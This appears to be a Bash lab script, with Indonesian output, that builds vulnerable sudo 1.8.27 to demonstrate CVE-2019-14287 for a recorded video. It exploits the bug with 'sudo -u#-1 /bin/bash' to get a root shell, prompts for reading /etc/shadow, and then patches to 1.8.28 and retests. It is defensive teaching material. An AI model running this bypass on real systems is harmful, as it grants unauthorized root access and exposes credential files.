#!/bin/bash
set -e

LAB_DIR="/opt/cve_lab"
SUDO_BIN="/usr/local/bin/sudo"
VISUDO_BIN="/usr/local/sbin/visudo"
SUDO_ETC="/usr/local/etc"

MERAH='\033[1;31m'
HIJAU='\033[1;32m'
KUNING='\033[1;33m'
BIRU='\033[1;36m'
NC='\033[0m'

cek_root() {
    if [ "$EUID" -ne 0 ]; then
        echo -e "${MERAH}[!] Jalankan script ini dengan sudo: sudo bash $0 $1${NC}"
        exit 1
    fi
}

install_sudo_versi() {
    local VERSI=$1
    echo -e "${KUNING}[*] Mengompilasi dan memasang Sudo versi ${VERSI}...${NC}"
    cd "$LAB_DIR"
    rm -rf "sudo-${VERSI}"
    tar -xzf "sudo-${VERSI}.tar.gz"
    cd "sudo-${VERSI}"

    # Gunakan sysconfdir=/usr/local/etc agar terisolasi dari /etc/sudoers bawaan Ubuntu 26.04 (@includedir)
    CFLAGS="-std=gnu89 -O2 -w" ac_cv_func_unsetenv=yes \
        ./configure --prefix=/usr/local --sysconfdir="$SUDO_ETC" --with-pam > /dev/null
    echo "#define HAVE___FUNC__ 1" >> config.h
    echo "#define HAVE_UNSETENV 1" >> config.h

    make -j$(nproc) > /dev/null
    make install > /dev/null

    if [ ! -x "$SUDO_BIN" ]; then
        echo -e "${MERAH}[GAGAL] Binary $SUDO_BIN gagal terpasang!${NC}"
        exit 1
    fi
    echo -e "${HIJAU}[+] Sudo versi ${VERSI} benar-benar terpasang di ${SUDO_BIN}${NC}"
}

mode_setup() {
    cek_root "setup"
    echo -e "${BIRU}=== TAHAP PERSIAPAN LAB CVE-2019-14287 ===${NC}"

    echo -e "${KUNING}[1/4] Menginstall compiler & library PAM...${NC}"
    apt-get update -y
    apt-get install -y build-essential wget libpam0g-dev

    echo -e "${KUNING}[2/4] Mengunduh Sudo 1.8.27 (Rentan) & 1.8.28 (Patch)...${NC}"
    mkdir -p "$LAB_DIR"
    cd "$LAB_DIR"
    [ ! -s "sudo-1.8.27.tar.gz" ] && (wget -q https://www.sudo.ws/dist/sudo-1.8.27.tar.gz || wget -q https://www.sudo.ws/dist/OLD/sudo-1.8.27.tar.gz)
    [ ! -s "sudo-1.8.28.tar.gz" ] && (wget -q https://www.sudo.ws/dist/sudo-1.8.28.tar.gz || wget -q https://www.sudo.ws/dist/OLD/sudo-1.8.28.tar.gz)

    echo -e "${KUNING}[3/4] Memasang Sudo 1.8.27 (Rentan)...${NC}"
    install_sudo_versi "1.8.27"

    echo -e "${KUNING}[4/4] Membuat user 'korban' & aturan sudoers (ALL, !root)...${NC}"
    if ! id "korban" &>/dev/null; then
        useradd -m -s /bin/bash korban
        echo "korban:korban" | chpasswd
    fi
    mkdir -p "${SUDO_ETC}/sudoers.d"
    chmod 0750 "${SUDO_ETC}/sudoers.d"
    echo "korban ALL=(ALL, !root) NOPASSWD: ALL" > "${SUDO_ETC}/sudoers.d/cve_2019_14287"
    chmod 0440 "${SUDO_ETC}/sudoers.d/cve_2019_14287"
    "$VISUDO_BIN" -cf "${SUDO_ETC}/sudoers"

    echo -e "\n${HIJAU}==========================================================${NC}"
    echo -e "${HIJAU}[SUKSES ASLI] Setup Lab Selesai! Versi terpasang:${NC}"
    $SUDO_BIN --version | head -n 1
    echo -e "Langkah wajib sebelum record video:"
    echo -e "1. Ubah Network VM ke ${KUNING}Host-Only / Internal Network${NC}"
    echo -e "2. Ambil ${KUNING}Snapshot VM${NC} sekarang"
    echo -e "3. Jalankan demo dengan: ${BIRU}sudo bash $0 demo${NC}"
    echo -e "${HIJAU}==========================================================${NC}"
}

mode_demo() {
    cek_root "demo"
    clear
    echo -e "${BIRU}==========================================================${NC}"
    echo -e "${BIRU}       LIVE DEMO EKSPLOITASI & MITIGASI CVE-2019-14287    ${NC}"
    echo -e "${BIRU}==========================================================${NC}"

    # TAHAP 1: KONDISI AWAL
    echo -e "\n${KUNING}>>> [TAHAP 1/5] KONDISI AWAL & CEK HAK AKSES USER 'korban'${NC}"
    su - korban -c "
        echo -e '${BIRU}$ whoami${NC}'
        whoami
        echo -e '\n${BIRU}$ ${SUDO_BIN} --version${NC}'
        ${SUDO_BIN} --version | head -n 2
        echo -e '\n${BIRU}$ ${SUDO_BIN} -l${NC}'
        ${SUDO_BIN} -l
        echo -e '\n${BIRU}$ ${SUDO_BIN} /bin/bash  (Mencoba akses root secara normal...)${NC}'
        ${SUDO_BIN} /bin/bash || true
    "
    read -p $'\n[Tekan ENTER untuk lanjut ke Tahap 2: Eksploitasi...]'

    # TAHAP 2 & 3: EKSPLOITASI & BUKTI DAMPAK
    echo -e "\n${MERAH}>>> [TAHAP 2 & 3/5] EKSPLOITASI BYPASS (!root) DENGAN UID -1${NC}"
    echo -e "${BIRU}$ ${SUDO_BIN} -u#-1 /bin/bash${NC}"
    echo -e "${HIJAU}[!] Berhasil masuk ke ROOT SHELL! Silakan ketik: whoami, id, head -n 5 /etc/shadow${NC}"
    echo -e "${KUNING}[!] Jika sudah selesai menunjukkan bukti, ketik 'exit' untuk lanjut ke tahap Patching.${NC}\n"

    su - korban -c "${SUDO_BIN} -u#-1 /bin/bash --norc"

    read -p $'\n[Tekan ENTER untuk lanjut ke Tahap 4: Patching ke Sudo 1.8.28...]'

    # TAHAP 4: PATCHING
    echo -e "\n${KUNING}>>> [TAHAP 4/5] MENERAPKAN PATCH RESMI (SUDO 1.8.28)${NC}"
    install_sudo_versi "1.8.28"

    read -p $'\n[Tekan ENTER untuk lanjut ke Tahap 5: Uji Ulang Pasca-Patch...]'

    # TAHAP 5: UJI ULANG PASCA-PATCH
    echo -e "\n${HIJAU}>>> [TAHAP 5/5] UJI ULANG EKSPLOITASI PASCA-PATCH${NC}"
    su - korban -c "
        echo -e '${BIRU}$ ${SUDO_BIN} --version${NC}'
        ${SUDO_BIN} --version | head -n 2
        echo -e '\n${BIRU}$ ${SUDO_BIN} -u#-1 /bin/bash${NC}'
        ${SUDO_BIN} -u#-1 /bin/bash || true
    "
    echo -e "\n${HIJAU}==========================================================${NC}"
    echo -e "${HIJAU}[SELESAI] Celah CVE-2019-14287 berhasil ditutup sepenuhnya!${NC}"
    echo -e "${HIJAU}==========================================================${NC}"
}

mode_reset() {
    cek_root "reset"
    echo -e "${KUNING}[*] Mengembalikan lab ke versi rentan (1.8.27) secara offline...${NC}"
    install_sudo_versi "1.8.27"
    echo -e "${HIJAU}[+] Lab siap dipakai ulang! Jalankan: sudo bash $0 demo${NC}"
}

case "$1" in
    setup) mode_setup ;;
    demo)  mode_demo ;;
    reset) mode_reset ;;
    *)
        echo "Cara pakai:"
        echo "  sudo bash $0 setup   -> Install & siapkan lab (butuh internet)"
        echo "  sudo bash $0 demo    -> Jalankan 5 tahap demo interaktif (offline)"
        echo "  sudo bash $0 reset   -> Kembalikan ke versi rentan jika ingin ulang take video"
        ;;
esac
